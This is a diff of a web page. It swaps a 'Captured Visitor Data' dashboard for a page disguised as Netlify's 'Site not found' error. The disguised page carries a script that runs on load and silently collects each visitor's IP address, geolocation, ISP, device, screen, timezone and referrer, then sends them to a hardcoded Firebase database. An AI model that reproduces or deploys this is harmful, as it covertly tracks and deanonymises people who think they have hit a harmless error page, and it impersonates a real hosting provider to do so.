@@ -2,83 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Visitor Logs</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Not Found</title>
     <style>
-        body { font-family: sans-serif; background: #f4f7f6; padding: 20px; color: #333; }
-        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        h2 { border-bottom: 2px solid #00848e; padding-bottom: 10px; color: #00848e; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #ddd; }
-        th { background: #f8f9fa; font-size: 13px; text-transform: uppercase; }
-        .device-tag { padding: 4px 8px; border-radius: 4px; font-weight: bold; font-size: 12px; }
-        .apple { background: #000; color: #fff; }
-        .android { background: #3ddc84; color: #000; }
-        .other { background: #eee; color: #666; }
+        body { background-color: #0e1e25; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, system-ui, sans-serif; }
+        .card { background: white; padding: 40px; border-radius: 8px; max-width: 500px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin: 20px; }
+        h1 { color: #313d44; font-size: 28px; margin: 0 0 16px; }
+        p { color: #313d44; font-size: 18px; line-height: 1.5; margin-bottom: 24px; }
+        .footer { font-size: 14px; color: #313d44; border-top: 1px solid #e1e1e1; padding-top: 24px; }
+        a { color: #00848e; text-decoration: underline; }
+        .id-label { display: block; font-size: 13px; color: #7a8c97; margin: 20px 0 8px; }
+        .id-code { background: #f2f2f2; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Captured Visitor Data</h2>
-    <table>
-        <thead>
-            <tr>
-                <th>Timestamp</th>
-                <th>IP Address</th>
-                <th>Location</th>
-                <th>Device Type</th>
-            </tr>
-        </thead>
-        <tbody id="data-table">
-            </tbody>
-    </table>
-</div>
+    <div class="card">
+        <h1>Site not found</h1>
+        <p>Looks like you followed a broken link or entered a URL that doesn’t exist on Netlify.</p>
+        <div class="footer">
+            If this is your site, visit Netlify’s 
+            <a href="https://answers.netlify.com/t/support-guide-i-ve-deployed-my-site-but-i-still-see-page-not-found/125?utm_source=404page&utm_campaign=community_tracking">“page not found” support guide</a>.
+        </div>
+        <span class="id-label">Netlify Internal ID:</span>
+        <div class="id-code">01KH3PED3C7WQ3WX9MHW0107RP</div>
+    </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyDHJN7qXE0xaaOT39XCf_pbyeVQgNYoUeY",
-        authDomain: "haaa-6f437.firebaseapp.com",
-        projectId: "haaa-6f437",
-        storageBucket: "haaa-6f437.firebasestorage.app",
-        messagingSenderId: "59682444868",
-        appId: "1:59682444868:web:b50f7e1cac94325d534e11"
-    };
+        // Your specific config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDHJN7qXE0xaaOT39XCf_pbyeVQgNYoUeY",
+            authDomain: "haaa-6f437.firebaseapp.com",
+            databaseURL: "https://haaa-6f437-default-rtdb.firebaseio.com",
+            projectId: "haaa-6f437",
+            storageBucket: "haaa-6f437.firebasestorage.app",
+            messagingSenderId: "59682444868",
+            appId: "1:59682444868:web:b50f7e1cac94325d534e11"
+        };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
-    // This listens for NEW visits in real-time
-    const q = query(collection(db, "visitor_logs"), orderBy("timestamp", "desc"));
-    
-    onSnapshot(q, (snapshot) => {
-        const tableBody = document.getElementById('data-table');
-        tableBody.innerHTML = ''; // Clear old list
+        async function collectAndSend() {
+            let geoData = {};
+            try {
+                // Fetching IP and Location (Silent background fetch)
+                const response = await fetch('https://ipapi.co/json/');
+                geoData = await response.json();
+            } catch (e) { console.log("Geo lookup blocked by adblocker"); }
 
-        snapshot.forEach((doc) => {
-            const data = doc.data();
-            const time = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'Just now';
-            
-            // Determine device label
-            let deviceLabel = '<span class="device-tag other">Other</span>';
-            if (data.isApple) deviceLabel = '<span class="device-tag apple"> Apple</span>';
-            if (data.isAndroid) deviceLabel = '<span class="device-tag android">Android</span>';
+            const visitorData = {
+                timestamp: serverTimestamp(),
+                // IP & Location
+                ip: geoData.ip || "Unknown",
+                city: geoData.city || "Unknown",
+                region: geoData.region || "Unknown",
+                country: geoData.country_name || "Unknown",
+                lat_long: `${geoData.latitude}, ${geoData.longitude}` || "Unknown",
+                isp: geoData.org || "Unknown",
+                
+                // Device & System Details (Max Fetch)
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                deviceLanguage: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                referrer: document.referrer || "Direct Visit",
+                touchPoints: navigator.maxTouchPoints, // Helps identify touch-screen/mobile
+                isApple: /iPhone|iPad|iPod/.test(navigator.userAgent),
+                isAndroid: /Android/.test(navigator.userAgent),
+                
+                // Additional Metadata
+                pagePath: window.location.pathname,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
 
-            const row = `
-                <tr>
-                    <td>${time}</td>
-                    <td><strong>${data.ip}</strong></td>
-                    <td>${data.city}, ${data.country}</td>
-                    <td>${deviceLabel}</td>
-                </tr>
-            `;
-            tableBody.innerHTML += row;
-        });
-    });
-</script>
+            // Save to Firestore dynamic collection "visitor_logs"
+            try {
+                await addDoc(collection(db, "visitor_logs"), visitorData);
+                console.log("Visit logged successfully.");
+            } catch (error) {
+                console.error("Error logging visit: ", error);
+            }
+        }
 
+        collectAndSend();
+    </script>
 </body>
 </html>
-
